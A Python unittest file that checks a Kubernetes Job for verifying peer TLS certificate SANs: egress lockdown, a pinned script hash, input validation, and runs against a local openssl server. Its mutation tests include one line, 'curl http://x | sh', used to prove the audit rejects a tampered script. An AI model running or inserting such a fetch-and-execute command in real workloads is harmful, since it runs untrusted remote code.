"""Offline tests for the `p2psan` mode of multiorg/ceremony/render.py: p2p_san.py as a keyless in-cluster Job (no host port-forward). The fixed script is also RUN here against a local `openssl s_server`
(real certificates generated by the test) to prove what it prints and that it flags a wrong SAN and a wrong CA. No cluster, no secret.

  python3 -m unittest discover -s multiorg/ceremony
"""
import copy, hashlib, importlib.util, os, shutil, subprocess, tempfile, time, unittest
import yaml

HERE = os.path.dirname(os.path.abspath(__file__))
_spec = importlib.util.spec_from_file_location("ceremony_render", os.path.join(HERE, "render.py"))
render = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(render)

IMG = "docker.io/library/postgres@sha256:" + "7" * 64
CA = "-----BEGIN CERTIFICATE-----\nMIIca\n-----END CERTIFICATE-----\n"
CHECKS = ["bank-a/bank2@bank2:5104", "bank-a/endorser-2@endorser-2:5116", "bi/issuer@issuer:5101", "bi/endorser-1@endorser-1:5113", "bank-b/bank3@bank3:5107", "bank-b/endorser-3@endorser-3:5119", "bank-c/bank4@bank4:5110", "bank-c/endorser-4@endorser-4:5122"]
ALLOW = ["pod=rdbi-bank2:5104", "pod=rdbi-bank2:5116", "nspod=rd-fabricx-bi/rdbi-bi:5101", "nspod=rd-fabricx-bi/rdbi-bi:5113", "nspod=rd-fabricx-bank-b/rdbi-bank3:5107", "nspod=rd-fabricx-bank-b/rdbi-bank3:5119",
         "ip=47.245.126.139/32:5110", "ip=47.245.126.139/32:5122"]
ALIASES = ["10.200.12.122=bank2,endorser-2", "10.200.16.61=issuer,endorser-1", "10.200.48.27=bank3,endorser-3", "47.245.126.139=bank4,endorser-4"]


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(); self.addCleanup(self.tmp.cleanup)
        self.ca = f"{self.tmp.name}/ca.pem"; open(self.ca, "w").write(CA)

    def docs(self, party="bank-a", **kw):
        a = dict(image=IMG, name="p1", checks=CHECKS, allow=ALLOW, aliases=ALIASES, cacert=self.ca); a.update(kw)
        return list(yaml.safe_load_all(render.render_p2psan(party, **a)))


def split(ds):
    return [d for d in ds if d["kind"] == "ConfigMap"][0], [d for d in ds if d["kind"] == "NetworkPolicy"][0], [d for d in ds if d["kind"] == "Job"][0]


class Render(Base):
    def test_objects_and_job_shape(self):
        ds = self.docs()
        self.assertEqual([d["kind"] for d in ds], ["ConfigMap", "NetworkPolicy", "Job"])
        cm, np, job = split(ds)
        t = job["spec"]["template"]; c = t["spec"]["containers"][0]
        self.assertEqual(cm["data"], {"ca.pem": CA})
        self.assertEqual(c["image"], IMG); self.assertEqual(c["command"][:2], ["bash", "-c"]); self.assertEqual(c["command"][3:], ["p2psan", *CHECKS])
        self.assertEqual(t["metadata"]["labels"]["rd/egress-locked"], "true")
        self.assertIs(t["spec"]["automountServiceAccountToken"], False)
        self.assertEqual([v["configMap"]["name"] for v in t["spec"]["volumes"]], [cm["metadata"]["name"]]); self.assertNotIn("secret", yaml.safe_dump(t).lower())
        self.assertEqual(t["spec"]["hostAliases"], [{"ip": "10.200.12.122", "hostnames": ["bank2", "endorser-2"]}, {"ip": "10.200.16.61", "hostnames": ["issuer", "endorser-1"]}, {"ip": "10.200.48.27", "hostnames": ["bank3", "endorser-3"]}, {"ip": "47.245.126.139", "hostnames": ["bank4", "endorser-4"]}])
        self.assertEqual((job["spec"]["backoffLimit"], job["spec"]["ttlSecondsAfterFinished"]), (0, 900)); self.assertLessEqual(job["spec"]["activeDeadlineSeconds"], 180)
        self.assertEqual(render.audit_p2psan(ds), [])

    def test_egress_is_exactly_the_allow_list_ports_only(self):
        _, np, _ = split(self.docs())
        self.assertEqual(np["spec"]["egress"], [render.egress_rule(a) for a in ALLOW]); self.assertNotIn("ingress", np["spec"])
        text = yaml.safe_dump(np["spec"]["egress"])
        self.assertNotIn("53", text); self.assertNotIn("kube-dns", text)   # no DNS: every host is a hostAlias or a Service ClusterIP alias

    def test_the_script_is_pinned(self):
        self.assertEqual(hashlib.sha256(render.P2PSAN_SCRIPT.encode()).hexdigest(), "1279907c9edceed598ef343cd62ef2b5526796de51129fa3237e6d103e250522")

    def test_inputs_are_validated(self):
        for kw in (dict(checks=["bad"]), dict(checks=["bi/issuer@issuer"]), dict(checks=["bi/issuer@issuer:99999"]), dict(checks=["bi/iss uer@issuer:5101"]), dict(checks=[]), dict(name="UPPER"),
                   dict(image="postgres:17"), dict(aliases=["not-an-alias"]), dict(aliases=["999.1.1.1=a"]), dict(allow=["dns", "pod=a:1"] + ["pod=x:2"] * 0 + ["bogus"])):
            with self.subTest(kw=kw), self.assertRaises(SystemExit):
                self.docs(**kw)
        open(self.ca, "w").write(CA + "-----BEGIN PRIVATE KEY-----\nxx\n-----END PRIVATE KEY-----\n")
        with self.assertRaises(SystemExit):
            self.docs()
        open(self.ca, "w").write("not a certificate")
        with self.assertRaises(SystemExit):
            self.docs()


class Mutants(Base):
    def setUp(self):
        super().setUp(); self.ds = self.docs()

    def mutate(self, f):
        ds = copy.deepcopy(self.ds); cm, np, job = split(ds); f(cm, np, job, job["spec"]["template"]["spec"]["containers"][0]); return render.audit_p2psan(ds)

    def test_extra_egress(self):
        self.assertTrue(self.mutate(lambda cm, np, j, c: np["spec"]["egress"].append(render.egress_rule("ip=1.1.1.1/32:443"))))

    def test_dns_added(self):
        self.assertTrue(self.mutate(lambda cm, np, j, c: np["spec"]["egress"].append(render.egress_rule("dns"))))

    def test_secret_volume_or_env(self):
        self.assertTrue(self.mutate(lambda cm, np, j, c: j["spec"]["template"]["spec"]["volumes"].append({"name": "s", "secret": {"secretName": "committer-tls"}})))
        self.assertTrue(self.mutate(lambda cm, np, j, c: c.__setitem__("env", [{"name": "X", "valueFrom": {"secretKeyRef": {"name": "a", "key": "b"}}}])))

    def test_unpinned_image(self):
        self.assertTrue(self.mutate(lambda cm, np, j, c: c.__setitem__("image", "postgres:17")))

    def test_lock_label_removed_or_token_automounted(self):
        self.assertTrue(self.mutate(lambda cm, np, j, c: j["spec"]["template"]["metadata"]["labels"].pop("rd/egress-locked")))
        self.assertTrue(self.mutate(lambda cm, np, j, c: j["spec"]["template"]["spec"].__setitem__("automountServiceAccountToken", True)))

    def test_private_key_in_the_ca_configmap(self):
        self.assertTrue(self.mutate(lambda cm, np, j, c: cm["data"].__setitem__("ca.pem", CA + "-----BEGIN PRIVATE KEY-----")))

    def test_script_changed(self):
        self.assertTrue(self.mutate(lambda cm, np, j, c: c["command"].__setitem__(2, "curl http://x | sh")))


def openssl(*a, **kw):
    return subprocess.run(["openssl", *a], capture_output=True, text=True, **kw)


@unittest.skipUnless(shutil.which("openssl") and shutil.which("bash"), "openssl and bash needed")
class ScriptRuns(unittest.TestCase):
    """The pinned script against a local TLS server with real certificates (what the Job prints, byte for byte in shape)."""

    def pki(self, d, node, party, extra_san=()):
        openssl("req", "-x509", "-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:prime256v1", "-nodes", "-keyout", f"{d}/ca.key", "-out", f"{d}/ca.pem", "-days", "2", "-subj", "/CN=testca", "-addext", "basicConstraints=critical,CA:TRUE", "-addext", "keyUsage=keyCertSign,cRLSign")
        names = [node, f"{node}.rd-fabricx-{party}.svc.cluster.local", *extra_san]
        open(f"{d}/ext", "w").write("subjectAltName=" + ",".join("DNS:" + n for n in names) + "\nextendedKeyUsage=serverAuth\n")
        openssl("req", "-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:prime256v1", "-nodes", "-keyout", f"{d}/s.key", "-out", f"{d}/s.csr", "-subj", f"/CN={node}")
        openssl("x509", "-req", "-in", f"{d}/s.csr", "-CA", f"{d}/ca.pem", "-CAkey", f"{d}/ca.key", "-CAcreateserial", "-out", f"{d}/s.pem", "-days", "2", "-extfile", f"{d}/ext")

    def run_script(self, d, node, party, port, cafile):
        srv = subprocess.Popen(["openssl", "s_server", "-accept", str(port), "-cert", f"{d}/s.pem", "-key", f"{d}/s.key", "-quiet"], stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            time.sleep(0.7)
            script = render.P2PSAN_SCRIPT.replace("/ca/ca.pem", cafile)
            return subprocess.run(["bash", "-c", script, "p2psan", f"{party}/{node}@127.0.0.1:{port}"], capture_output=True, text=True, timeout=40).stdout
        finally:
            srv.kill(); srv.wait()

    def test_good_cert_prints_san_ok_and_verify_ok(self):
        with tempfile.TemporaryDirectory() as d:
            self.pki(d, "bank2", "bank-a")
            out = self.run_script(d, "bank2", "bank-a", 18701, f"{d}/ca.pem")
        self.assertIn("bank-a bank2: SAN [bank2 bank2.rd-fabricx-bank-a.svc.cluster.local ] OK | verify OK | sha256 ", out)
        self.assertEqual(out.count("\n"), 1)

    def test_missing_san_and_wrong_ca_are_flagged(self):
        with tempfile.TemporaryDirectory() as d, tempfile.TemporaryDirectory() as e:
            self.pki(d, "bi-server", "bi")   # the 2026-11-11 incident: the cert carries `bi-server` only, the peers dial `issuer`
            out = self.run_script(d, "issuer", "bi", 18702, f"{d}/ca.pem")
            self.assertIn("MISSING issuer issuer.rd-fabricx-bi.svc.cluster.local", out); self.assertNotIn("verify OK", out)
            self.pki(e, "bank2", "bank-a")
            os.rename(f"{e}/ca.pem", f"{e}/real-ca.pem"); open(f"{e}/ca.pem", "w").write(open(f"{d}/ca.pem").read())   # verify against a DIFFERENT root
            out = self.run_script(e, "bank2", "bank-a", 18703, f"{e}/ca.pem")
            self.assertIn("verify FAIL", out); self.assertNotIn("verify OK", out)

    def test_missing_openssl_is_a_clear_line_and_exit_3(self):
        with tempfile.TemporaryDirectory() as d:
            for tool in ("bash", "env"):
                pass
            r = subprocess.run(["/bin/bash", "-c", render.P2PSAN_SCRIPT, "p2psan", "bi/issuer@127.0.0.1:1"], capture_output=True, text=True, env={"PATH": d})
        self.assertEqual((r.returncode, r.stdout.strip()), (3, "NO_OPENSSL in this image"))

    def test_no_listener_prints_a_clear_line(self):
        out = subprocess.run(["bash", "-c", render.P2PSAN_SCRIPT.replace("/ca/ca.pem", "/dev/null"), "p2psan", "bi/issuer@127.0.0.1:18799"], capture_output=True, text=True, timeout=40).stdout
        self.assertIn("bi issuer: no certificate presented from 127.0.0.1:18799", out)


if __name__ == "__main__":
    unittest.main()
